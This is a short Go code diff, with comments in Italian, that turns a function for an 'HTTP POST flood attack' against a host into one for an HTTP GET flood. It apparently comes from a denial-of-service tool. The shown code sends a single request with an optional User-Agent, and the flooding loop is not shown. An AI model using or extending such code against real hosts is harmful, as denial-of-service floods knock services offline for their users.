@@ -8,8 +8,8 @@ import (
 	"time"
 )
 
-// SendHTTPPost esegue un attacco HTTP POST flood contro un host
-func SendHTTPPost(target, body, userAgent string) error {
+// SendHTTPGet esegue un attacco HTTP GET flood contro un host
+func SendHTTPGet(target string, userAgent string) error {
 	// Aggiungiamo il prefisso "http://" se manca
 	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
 		target = "http://" + target
@@ -24,9 +24,9 @@ func SendHTTPPost(target, body, userAgent string) error {
 		Timeout:   10 * time.Second,
 	}
 
-	req, err := http.NewRequest("POST", target, strings.NewReader(body))
+	req, err := http.NewRequest("GET", target, nil)
 	if err != nil {
-		return fmt.Errorf("failed to create HTTP POST request: %v", err)
+		return fmt.Errorf("failed to create HTTP GET request: %v", err)
 	}
 
 	// Imposta l'User-Agent se specificato
@@ -34,11 +34,9 @@ func SendHTTPPost(target, body, userAgent string) error {
 		req.Header.Set("User-Agent", userAgent)
 	}
 
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
 	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("HTTP POST request failed: %v", err)
+		return fmt.Errorf("HTTP GET request failed: %v", err)
 	}
 	defer resp.Body.Close()
 
